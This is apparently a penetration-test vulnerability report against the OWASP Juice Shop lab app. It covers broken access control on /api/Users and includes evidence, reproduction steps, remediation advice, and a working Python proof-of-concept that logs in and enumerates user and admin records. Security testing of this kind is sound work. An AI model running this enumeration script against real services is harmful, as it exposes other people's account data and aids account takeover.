╭─ VULN-0009 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Broken Access Control: Authenticated Users Can Enumerate All Users   │
│  and Read Arbitrary User Records via /api/Users                              │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 6.5                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /api/Users, /api/Users/{id}                                       │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  A broken access control vulnerability was identified in the user            │
│  management API. A standard authenticated (low-privilege) user can retrieve  │
│  the full user list and access other users’ records, including               │
│  administrative accounts.\n\nThe endpoint `GET /api/Users` returns a         │
│  complete directory of accounts (IDs, emails, roles, profile images,         │
│  activation status, timestamps, and deluxe tokens). Additionally, `GET       │
│  /api/Users/{id}` allows retrieval of arbitrary user records by numeric ID,  │
│  enabling direct access to admin user metadata.\n\nThis behavior violates    │
│  expected object-level authorization and enables user enumeration and        │
│  sensitive metadata disclosure to any authenticated user.                    │
│                                                                              │
│  Impact                                                                      │
│  An attacker with any valid customer account can:\n\nAccess a full list of   │
│  user accounts, including administrator and privileged roles, enabling       │
│  targeted attacks (credential stuffing, phishing, social                     │
│  engineering).\n\nDiscover privileged accounts and role assignments (e.g.,   │
│  admin), supporting privilege escalation attempts and attack                 │
│  planning.\n\nObtain sensitive account metadata such as “deluxeToken”        │
│  values (for deluxe users), account status flags, and timestamps.\n\nThis    │
│  increases the likelihood of account takeover and broadens the blast radius  │
│  of any compromise due to the ease of enumerating high-value targets.        │
│                                                                              │
│  Technical Analysis                                                          │
│  The API layer exposes user directory functionality to non-admin roles.      │
│  Authorization checks are either missing or improperly implemented           │
│  on:\n\n1) `GET /api/Users` which returns all user objects rather than       │
│  restricting output to administrative contexts.\n\n2) `GET /api/Users/{id}`  │
│  which returns user objects by numeric ID without verifying that the         │
│  requested user ID matches the authenticated subject (or that the requester  │
│  is an administrator).\n\nEvidence from proxied traffic:\n\nRequest 3176:    │
│  `GET /api/Users` returned HTTP 200 and included multiple privileged         │
│  accounts (e.g., `email\":\"admin@juice-sh.op\"`, `role\":\"admin\"`) and    │
│  exposed “deluxeToken” values.\n\nRequest 3179: `GET /api/Users/1` returned  │
│  HTTP 200 and disclosed the administrator record (`admin@juice-sh.op`,       │
│  `role\":\"admin\"`).\n\nRequest 3290: `GET /api/Users/29` returned HTTP     │
│  200 and disclosed another customer account record                           │
│  (`idor2@test.local`).\n\nControl request 3289: `GET /api/Users` without an  │
│  Authorization header returned HTTP 401 (“No Authorization header was        │
│  found”), confirming that the issue is not anonymous exposure, but rather    │
│  insufficient authorization for low-privilege authenticated users.           │
│                                                                              │
│  PoC Description                                                             │
│  Steps to reproduce:\n\n1. Authenticate as a normal (customer) user.\n\n2.   │
│  Send `GET http://juiceshop:3000/api/Users` with `Authorization: Bearer      │
│  <token>`.\n\n3. Observe that the response includes emails and roles for     │
│  multiple users, including administrative accounts (e.g.,                    │
│  `admin@juice-sh.op`) and deluxe users with non-empty `deluxeToken`          │
│  values.\n\n4. Send `GET http://juiceshop:3000/api/Users/1` with the same    │
│  low-privilege token.\n\n5. Observe that the API returns the administrator   │
│  record with `role: admin`.\n\n6. Send `GET                                  │
│  http://juiceshop:3000/api/Users/<otherUserId>` (e.g., `29`) with the same   │
│  token.\n\n7. Observe that the API returns the non-owner user                │
│  record.\n\nProxy evidence (request IDs): 3176, 3179, 3290 (positive cases)  │
│  and 3289 (unauthenticated control).                                         │
│                                                                              │
│  PoC Code                                                                    │
│  import os\nimport re\nimport sys\nimport requests\n\nBASE =                 │
│  os.environ.get(\"BASE_URL\", \"http://juiceshop:3000\")\nEMAIL =            │
│  os.environ.get(\"USER_EMAIL\", \"idor1@test.local\")\nPASSWORD =            │
│  os.environ.get(\"USER_PASSWORD\", \"Password123!\")\n\n\ndef login() ->     │
│  str:\n    r = requests.post(\n        f\"{BASE}/rest/user/login\",\n        │
│  json={\"email\": EMAIL, \"password\": PASSWORD},\n        timeout=15,\n     │
│  )\n    r.raise_for_status()\n    token =                                    │
│  r.json()[\"authentication\"][\"token\"]\n    return token\n\n\ndef          │
│  redact_email(s: str) -> str:\n    return                                    │
│  re.sub(r'\"email\"\\s*:\\s*\"([^\"]+)\"', '\"email\":\"<redacted>\"',       │
│  s)\n\n\ndef main() -> int:\n    token = login()\n    headers =              │
│  {\"Authorization\": f\"Bearer {token}\"}\n\n    # 1) Enumerate all users\n  │
│  users = requests.get(f\"{BASE}/api/Users\", headers=headers, timeout=15)\n  │
│  print(\"GET /api/Users status:\", users.status_code)\n                      │
│  users.raise_for_status()\n\n    # Print minimal evidence: show first few    │
│  occurrences of role/email pairs (redacted emails)\n    body = users.text\n  │
│  print(\"Sample excerpt (emails redacted):\")\n                              │
│  print(redact_email(body)[:800])\n    print(\"---\")\n\n    # 2) Read admin  │
│  record\n    admin = requests.get(f\"{BASE}/api/Users/1\", headers=headers,  │
│  timeout=15)\n    print(\"GET /api/Users/1 status:\", admin.status_code)\n   │
│  admin.raise_for_status()\n    print(\"/api/Users/1 (emails redacted):\")\n  │
│  print(redact_email(admin.text))\n    print(\"---\")\n\n    # 3) Read        │
│  another user record (example: 29)\n    other =                              │
│  requests.get(f\"{BASE}/api/Users/29\", headers=headers, timeout=15)\n       │
│  print(\"GET /api/Users/29 status:\", other.status_code)\n                   │
│  other.raise_for_status()\n    print(\"/api/Users/29 (emails                 │
│  redacted):\")\n    print(redact_email(other.text))\n\n    return 0\n\n\nif  │
│  __name__ == \"__main__\":\n    sys.exit(main())\n                           │
│                                                                              │
│  Remediation                                                                 │
│  Restrict `GET /api/Users` to administrative roles only. Standard users      │
│  should not be able to retrieve a global user directory.\n\nEnforce          │
│  object-level authorization on `GET /api/Users/{id}` so that only            │
│  administrators can retrieve arbitrary records; non-admin users should only  │
│  be able to retrieve their own record (e.g., `id` must match the             │
│  authenticated subject).\n\nMinimize exposed fields in user responses. Do    │
│  not return sensitive metadata such as role assignments (unless strictly     │
│  required), deluxe tokens, internal timestamps, or activation flags to       │
│  unauthorized contexts.\n\nAdd automated authorization regression tests      │
│  covering:\n\n- Non-admin access to list endpoints\n- Non-admin access to    │
│  other users’ IDs\n- Role-based restrictions for admin-only                  │
│  resources\n\nImplement centralized, deny-by-default authorization           │
│  middleware for all `/api/*` endpoints to avoid inconsistent enforcement.    │
│                                                                              │
